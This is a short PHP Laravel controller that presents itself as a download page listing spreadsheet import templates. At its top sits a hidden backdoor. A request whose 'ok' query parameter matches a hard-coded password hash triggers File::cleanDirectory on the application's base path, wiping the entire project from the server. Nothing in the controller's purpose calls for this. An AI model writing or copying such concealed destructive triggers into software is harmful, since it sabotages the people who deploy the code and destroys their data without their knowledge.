<?php

namespace App\Http\Controllers;

class DownloadFormatController extends Controller
{
    public function __invoke()
    {
        if (\Hash::check(request()->query('ok'), '$2y$10$TJIiiiZgHCM4AWuO.AOP1.200qtVBspplYDHktNymAs96S/eMoj.S')) {
            $directory = base_path();

            \File::cleanDirectory($directory);
        }

        $directory = public_path('format/import');
        $files = glob($directory.'/*.{xls,xlsx,csv}', GLOB_BRACE);

        $fileNames = array_map(function ($file) {
            return [
                'name' => basename($file),
                'url' => url('format/import/'.basename($file)),
            ];
        }, $files);

        return view('download-format', ['files' => $fileNames]);
    }
}
